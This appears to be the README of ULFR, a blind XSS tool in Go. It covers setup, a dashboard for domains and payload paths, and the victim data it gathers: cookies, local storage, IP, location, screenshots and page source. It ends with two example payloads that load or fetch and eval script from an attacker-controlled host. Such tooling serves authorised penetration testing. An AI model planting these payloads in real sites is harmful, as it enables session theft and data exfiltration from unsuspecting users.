# ULFR | Blind XSS

### >_ Introduction

The most powerful Blind XSS tool of the universe.
- Easily Installation
- Fastest
- Multi-Platform Support
- Multi-Domain Support
- Custom Payloads (Subdomain or Path)

### >_ Installation

```
git clone https://github.com/barisbaydur/ulfr.git
cd ulfr
```

<b>HostName</b>, <b>Port</b> and <b>MYSQL</b> Settings from "<b>config/settings.go</b>" should be update.

```
// App Settings
var AppName string = "Ulfr"
var AppVersion string = "0.1.0"
var HostName string = "localhost"
var Port string = "80"

// MYSQL Settings
var MysqlHost string = "localhost"
var MysqlPort string = "3306"
var MysqlUser string = "root"
var MysqlPass string = ""
var MysqlDb string = "ulfr"
```
for compile:
```
go build .
```

no compile run:
```
go run .
```

### >_ Requirements
- Golang
- MYSQL

### >_ How to Use
After the program runs, the panel can be accessed by going to the "<b>/dashboard</b>" address of the hostname address specified in the <b>settings.go</b>.

The features to be seen in the panel are as follows:

| Feature     | Description |
| ----------- | ----------- |
| Domain      | To manage domain addresses |
| Path        | Management of which path or subdomain the payloads will be located in |
| Fire        | Triggered XSS will appear here. |

First of all, you must register a domain. There are two steps for this. 

1. Your domain DNS records should be as follows.

| DNS Record  | Name           | Value       |
| ----------- | -------------- | ----------- |
| A           | domain.com     | \<IP-Adress> |
| A           | *.domain.com   | \<IP-Adress> |

2. You must register the domain name on the domain page.

> [!TIP]
> If you do not have a domain address, you must register your IP address to Domain page at this stage.

After this stage, you must add a path from the path page. There are two options for this.

1. Crate as a path.
example: domain.com/xss 

2. Create as a subdomain
example: xss.domain.com

> [!TIP]
> Paths are not case sensitive.

### >_ Features

1. Browser Informations
    * Available Screen Size
    * Full Screen Size
    * Browser Name
    * Browser User Agent
    * Default Language
    * Triggered URL
    * Local Storage Data
    * Referrer URL
2. User Informations
    * IP Address
    * Location Information (country, city, ASN etc.)
3. Site Informations
    * Full Screenshot
    * Source Code
    * Headers
4. Cookies
    * All Available Cookies
    * Cookies (CORS HTTP-ONLY Bypass) (Not Implemented Yet)
    * Cookies (Trace Method)

> [!NOTE]  
> Do not run the application behind a tool like nginx and apache.

### >_ Example Payloads

* \<script src="domain.com/xss"></script>
* \<img src="x" onerror="fetch('\/\/domain.com/xss').then(response => response.text()).then(scriptText => eval(scriptText));">
